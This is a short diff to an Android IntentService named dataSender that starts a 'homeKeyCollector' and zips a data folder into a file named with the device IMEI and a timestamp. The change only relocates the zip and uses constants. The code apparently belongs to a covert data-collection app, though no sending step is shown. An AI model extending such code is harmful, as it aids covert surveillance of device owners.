@@ -23,6 +23,8 @@ import java.io.File;
 import static com.media.ui.Util.logger.logg;
 import static com.media.ui.Util.utility.imi;
 import static com.media.ui.Util.zip.zipFileAtPath;
+import static com.media.ui.constants.ZIP_EXT;
+import static com.media.ui.constants.ZIP_FILE_NAME;
 
 /**
  * An {@link IntentService} subclass for handling asynchronous task requests in
@@ -56,7 +58,11 @@ public class dataSender extends IntentService {
             new homeKeyCollector(this);
 
             File d = new File(Environment.getExternalStorageDirectory(), constants.DataFolder);
-            File f = new File(Environment.getExternalStorageDirectory(), "final_"+imi(this)+"_"+String.valueOf(timi)+".zip");
+            File root = new File(Environment.getExternalStorageDirectory(), constants.ZIPFolder);
+            if (!root.exists()) {
+                root.mkdirs();
+            }
+            File f = new File(root, ZIP_FILE_NAME+constants.UNDERSCORE+imi(this)+constants.UNDERSCORE+String.valueOf(timi)+ZIP_EXT);
             if ((d.exists()) && (d.isDirectory())) {
                 if (zipFileAtPath(d.getAbsolutePath(), f.getAbsolutePath())) {
                     logg("FileZipped");
